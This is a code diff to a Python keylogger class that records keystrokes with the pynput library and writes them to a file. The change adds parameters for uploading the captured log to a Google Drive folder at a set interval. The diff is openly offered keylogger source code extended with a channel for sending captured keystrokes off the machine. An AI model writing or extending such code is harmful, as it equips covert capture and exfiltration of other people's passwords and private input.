@@ -2,8 +2,13 @@ from pynput.keyboard import Key, Listener
 from file_handler import FileHandler
 
 class KeyLogger:
-    def __init__(self, filename, seconds_per_log) -> None:
-        self.fileHandler = FileHandler(filename=filename, timer_count=seconds_per_log)
+    def __init__(self, filename, seconds_per_log, gdrive_upload_time, gdrive_folder_id) -> None:
+        self.fileHandler = FileHandler(
+            filename=filename,
+            timer_count=seconds_per_log,
+            gdrive_upload_time=gdrive_upload_time,
+            gdrive_folder_id=gdrive_folder_id
+        )
 
     def __on_press(self, key) -> None:
         self.fileHandler.print_key_to_file(key)
